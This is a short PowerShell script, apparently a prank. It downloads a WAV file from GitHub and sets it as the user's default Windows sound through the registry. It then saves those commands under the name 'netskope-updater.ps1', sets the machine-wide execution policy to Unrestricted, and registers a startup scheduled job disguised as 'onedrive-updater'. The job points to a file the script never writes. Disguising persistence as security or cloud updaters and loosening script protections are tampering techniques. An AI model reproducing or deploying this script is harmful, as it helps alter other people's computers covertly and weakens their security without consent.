New-Item -ItemType Directory -Force -Path C:\temp
Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/doo.wav" -OutFile "C:\temp\doo.wav"

(New-Object -ComObject WScript.Shell).RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current\","c:\temp\doo.wav","REG_SZ")

Remove-Item -Path C:\temp\netskope-updater.ps1
Add-Content -Path C:\temp\netskope-updater.ps1 -Value @"
New-Item -ItemType Directory -Force -Path C:\temp
Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/doo.wav" -OutFile "C:\temp\doo.wav"

(New-Object -ComObject WScript.Shell).RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current\","c:\temp\doo.wav","REG_SZ")
"@

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force
$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
Unregister-ScheduledJob -Name onedrive-updater
Register-ScheduledJob -Trigger $trigger -FilePath C:\temp\onedrive-updater.ps1 -Name onedrive-updater
